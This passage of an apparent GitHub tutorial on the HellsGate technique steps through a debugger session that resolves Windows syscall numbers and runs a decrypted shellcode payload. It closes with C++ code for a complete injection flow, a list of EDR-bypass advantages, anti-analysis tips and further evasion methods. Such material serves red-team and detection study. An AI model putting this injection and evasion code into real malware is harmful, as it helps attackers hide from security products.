*   This process repeats for `NtCreateThreadEx`, whose system call number is found to be `0xbc`. By following its address in the disassembler, we confirm it points to the correct function.
*   Once all four structures are filled, the `VX_TABLE` at its memory address contains all the resolved addresses and numbers.

---

Before we proceed, we need to remove the hardcoded `int 3` breakpoint instruction. To do this, we use the debugger's "Assemble" feature to overwrite the `int 3` opcode with a `NOP` (No Operation) instruction, which has no effect.

<img width="1611" height="803" alt="image" src="https://github.com/user-attachments/assets/db10957d-dab2-46f0-b9f0-3c1edb13fb6e" />
<img width="1607" height="797" alt="image" src="https://github.com/user-attachments/assets/916e18d0-c547-4eea-b85a-1905be41f6e6" />

When the debug breakpoint hits, observe:
- **RAX register** contains the hash value for the target function
- **RCX register** holds ntdll base address
- **RDX register** contains export directory pointer
- **R8 register** points to the VX_TABLE_ENTRY structure

Now, with the `RAX` register holding our target function hash, we see that the `R8` register holds a memory address. 

<img width="1613" height="460" alt="image" src="https://github.com/user-attachments/assets/910ebbec-5c4a-49dd-a988-6f81e3896cf5" />

Let's examine what's at that address in the memory dump.

<img width="1603" height="545" alt="image" src="https://github.com/user-attachments/assets/26d32634-2323-43ed-903e-edf59f35931e" />

As you can see, it already contains our hash value. Since `R8` is the third parameter for this function call, this address is a pointer to the `VX_TABLE_ENTRY` structure for `NtAllocateVirtualMemory`.

<img width="1610" height="345" alt="image" src="https://github.com/user-attachments/assets/4a97aee9-60b9-481b-a6de-5fae43989234" />

#### 3. Verifying Syscall Resolution

After resolution, check the VX_TABLE_ENTRY structure:
- **pAddress** field contains the function address in ntdll
- **dwHash** field shows the precomputed hash
- **wSystemCall** field contains the dynamically resolved syscall number
 
<img width="1617" height="357" alt="image" src="https://github.com/user-attachments/assets/4314ece1-5df4-4feb-8bc7-40441eb73c6e" />

---

Example verification in debugger:
```assembly
; Check NtAllocateVirtualMemory resolution
ntdll!NtAllocateVirtualMemory: 0x00007FFC04A31250
Resolved Syscall: 0x0018
```
We will now step over the `get_vx_table_entry` function. Upon return, we can see the structure has been populated: an address is stored in the first element, and the system call number `0x18` is in the third.

Let's verify this is correct. We can go to the symbols view for `ntdll.dll` and find `NtAllocateVirtualMemory`. Its system call number is indeed `0x18`, confirming our function worked and the first structure is filled.

<img width="1681" height="813" alt="image" src="https://github.com/user-attachments/assets/325fa90c-b9e3-4019-9508-eaf42082ee6d" />
<img width="1684" height="817" alt="image" src="https://github.com/user-attachments/assets/ad09c2c9-9ee4-4779-89d2-0e349fa137a3" />
<img width="1679" height="808" alt="image" src="https://github.com/user-attachments/assets/794822c3-2535-4086-ba4c-920e1cfa0fe6" />
<img width="1679" height="809" alt="image" src="https://github.com/user-attachments/assets/3f6d5c3b-22dc-4844-b919-63baf9d72512" />


We then repeat this process for the next function, `NtCreateThreadEx`. Stepping over its population call, we see its system call number, `0xbc`, is stored. 

<img width="1685" height="820" alt="image" src="https://github.com/user-attachments/assets/fc7c64ca-882f-4b04-94c8-7716265ce6af" />

Instead of checking the symbols again, we can take the function address that was found and follow it in the disassembler.

<img width="1682" height="817" alt="image" src="https://github.com/user-attachments/assets/a615a538-fa5b-4a9e-92c1-b028d572ed82" />

This confirms it points to the correct `NtCreateThreadEx` function which is `B8 BC 000000`, proving the technique is working and the table is being filled correctly.
 
<img width="1684" height="824" alt="image" src="https://github.com/user-attachments/assets/2e22fba6-45b5-47e0-a6d2-67331de6b998" />


We let the program run to complete the population for all four structures. 

<img width="578" height="82" alt="image" src="https://github.com/user-attachments/assets/5b11d6f4-f778-4175-af71-ed93f293d8f1" />
<img width="581" height="117" alt="image" src="https://github.com/user-attachments/assets/c5d72050-314e-49bd-97bc-1810fe18f6f9" />
 <img width="580" height="120" alt="image" src="https://github.com/user-attachments/assets/939c1be3-7056-458e-8f84-85121a5128a7" />
<img width="576" height="119" alt="image" src="https://github.com/user-attachments/assets/e0eba020-4e22-4840-bfd9-b5df8ca9f4cd" />

We can then inspect the final `VX_TABLE` at its memory address (`0xf99...`) to see all the resolved addresses and system call numbers.

<img width="1444" height="644" alt="image" src="https://github.com/user-attachments/assets/c41034ba-631e-49a1-a426-5556870828c2" />
<img width="1672" height="467" alt="image" src="https://github.com/user-attachments/assets/6e935185-14b2-4632-9fb7-8210bd79744b" />
<img width="1678" height="731" alt="image" src="https://github.com/user-attachments/assets/a79e3e47-6616-4915-bfae-15ab2692e091" />


### Stepping Through the Payload Execution

The execution now proceeds to the payload function. We set a breakpoint at its entry and step into it and hit enter on the cmd.

<img width="1685" height="809" alt="image" src="https://github.com/user-attachments/assets/c6c0cca9-99cb-4ff9-ad7e-a73d2f28119c" />
<img width="1679" height="555" alt="image" src="https://github.com/user-attachments/assets/fb517c1f-5974-4df0-9f04-89935391595b" />

The first operation is a `LoadLibrary` call, which is only necessary for our specific message box payload. The shellcode itself doesn't load this library, so we must ensure it's present in the process beforehand.

<img width="1609" height="810" alt="image" src="https://github.com/user-attachments/assets/df665e0b-8342-47a1-bfe5-232276801d92" />


After some diagnostic `printf` calls, we reach the core of the technique. We see the two values that correspond to our `HellsGate` and `HellDescent` functions. Let's examine the first call to `NtAllocateVirtualMemory`.

<img width="1609" height="818" alt="image" src="https://github.com/user-attachments/assets/0f2b6d0c-0601-4ae0-9eed-89ab52812161" />
<img width="1605" height="803" alt="image" src="https://github.com/user-attachments/assets/561c854e-d916-4feb-9516-dd6209e89180" />
<img width="1611" height="683" alt="image" src="https://github.com/user-attachments/assets/cd0f3b36-8296-4d90-b63e-5cca102f2735" />


1.  **Calling `HellsGate`:** The `HellsGate` function is called with a single parameter. We see the value `0x18` (the system call number for `NtAllocateVirtualMemory`) moved into the `ECX` register. Stepping into `HellsGate` shows this value being copied into the global variable.

<img width="1609" height="800" alt="image" src="https://github.com/user-attachments/assets/4d15bdda-030b-40ee-946c-4711901edbf7" />

This is from this code `hellsgate.asm`:

<img width="1611" height="800" alt="image" src="https://github.com/user-attachments/assets/6826fc96-b01f-4d44-8959-b566d794cd61" />


3.  **Calling `HellDescent`:** Immediately after, `HellDescent` is called. It is passed the same parameters that the real `NtAllocateVirtualMemory` function expects. Note that the second parameter (`RDX`) is a pointer to a variable that will receive the address of the newly allocated memory.

<img width="1612" height="794" alt="image" src="https://github.com/user-attachments/assets/35c5b830-cb3f-40fa-8a81-0d28624f95ff" />

Hit `enter`:

<img width="1613" height="807" alt="image" src="https://github.com/user-attachments/assets/ae00761c-6ce2-4ac8-b1ae-658c0acb7345" />

Stepping into `HellDescent`, we observe it retrieving the system call number `0x18` from the global variable, moving it into `EAX`, and executing the `syscall` instruction.

<img width="1609" height="793" alt="image" src="https://github.com/user-attachments/assets/95ba664c-c173-47e2-adcf-93872fd05ab4" />

After the system call returns and we step over, we can see that the memory address variable (pointed to by `RDX`) has been populated with a valid address. 

We can verify this successful allocation by checking the process memory in a tool like Process Hacker, where a new, private commit memory page will be visible at this address. This confirms the entire HellsGate technique has executed successfully.

<img width="1615" height="799" alt="image" src="https://github.com/user-attachments/assets/6ce52d97-1b49-4f01-a846-e6888ee9ea5b" />

<img width="1610" height="791" alt="image" src="https://github.com/user-attachments/assets/eac184d6-100d-484e-b608-f10b3cf9fbd8" />

<img width="1610" height="788" alt="image" src="https://github.com/user-attachments/assets/9ae57efd-9795-44fe-8ba0-6d62873217e4" />

<img width="1607" height="313" alt="image" src="https://github.com/user-attachments/assets/bbb5ca31-fe6d-4ad8-abe1-9ddc3b089899" />

Currently empty:

<img width="1613" height="339" alt="image" src="https://github.com/user-attachments/assets/e1377775-d637-44b0-8d7b-913acc4fc93e" />

But after a while, we should see this memory being filled with decrypted payload:

<img width="1612" height="800" alt="image" src="https://github.com/user-attachments/assets/d32386c3-5a90-4809-aa0e-0694c81f5c10" />

<img width="1612" height="792" alt="image" src="https://github.com/user-attachments/assets/260fe6a8-ab41-4e19-bf92-0e4b3ee8385b" />

If we hit `enter` our shellcode gets executed:

<img width="1609" height="803" alt="image" src="https://github.com/user-attachments/assets/8e6b9159-d480-4bbe-b815-2bfa530e266f" />

## Practical Usage

### Making Direct Syscalls

```cpp
// Instead of calling VirtualAlloc, use:
HellsGate(VxTable[0].wSystemCall);  // Set NtAllocateVirtualMemory syscall
NTSTATUS status = HellDescent(
    GetCurrentProcess(), 
    &lpAddress, 
    0, 
    &dwSize, 
    MEM_COMMIT | MEM_RESERVE, 
    PAGE_READWRITE
);
```

### Complete Injection Flow

```cpp
// 1. Allocate memory
HellsGate(VxTable[0].wSystemCall);
HellDescent(GetCurrentProcess(), &lpAddress, 0, &dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

// 2. Write payload
memcpy(lpAddress, decryptedPayload, payloadSize);

// 3. Change memory protection  
HellsGate(VxTable[1].wSystemCall);
HellDescent(GetCurrentProcess(), &lpAddress, &dwSize, PAGE_EXECUTE_READ, &oldProtect);

// 4. Execute
HellsGate(VxTable[2].wSystemCall);
HellDescent(NULL, &hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), lpAddress, NULL, FALSE, 0, 0, 0, NULL);
```

## Advantages

- **Version Independent**: No hardcoded syscall numbers
- **Bypasses Hooks**: Uses direct syscalls instead of hooked APIs
- **Stealthy**: No suspicious API calls to monitor
- **Reliable**: Works across Windows versions without modification

## Limitations

- **Complexity**: Requires understanding of PE structure and assembly
- **Detection**: Some EDRs may monitor direct syscall usage patterns
- **Maintenance**: Hash collisions possible if Microsoft adds functions with same hash

## Advanced Considerations

### Hash Collision Prevention
The DJB2 hash algorithm used has a low collision rate, but for critical operations, consider:
- Using a different hash algorithm
- Adding length checks
- Implementing fallback verification

### Anti-Analysis Techniques
- Remove debug breakpoints in production
- Obfuscate hash values
- Implement runtime integrity checks
- Use multiple resolution methods as fallback

## Verification Methods

### Manual Verification
```cpp
// Verify resolved syscall numbers match expectations
printf("NtAllocateVirtualMemory: 0x%X\n", VxTable[0].wSystemCall);
printf("NtCreateThreadEx: 0x%X\n", VxTable[2].wSystemCall);
```

### Runtime Validation
```cpp
// Ensure syscall numbers are within expected range
if (VxTable[0].wSystemCall < 0x0001 || VxTable[0].wSystemCall > 0x0FFF) {
    // Potential detection or corruption
    return -1;
}
```

## Conclusion

HellsGate provides a robust method for dynamic syscall resolution that effectively bypasses user-mode API hooks. By combining PE parsing, hash-based function resolution, and direct system calls, this technique offers a powerful evasion mechanism that works across Windows versions without hardcoded dependencies.

The technique demonstrates that while security products can hook API functions, they cannot prevent direct system call invocation when the syscall numbers are dynamically resolved at runtime.

## Next Steps

After implementing HellsGate, consider:
1. **HalosGate**: Enhanced version that handles syscall number randomization
2. **TartarusGate**: Further improvements for advanced EDR evasion
3. **Syscall Obfuscation**: Techniques to hide direct syscall usage
4. **Integration**: Combining with other evasion methods for layered protection


</details>
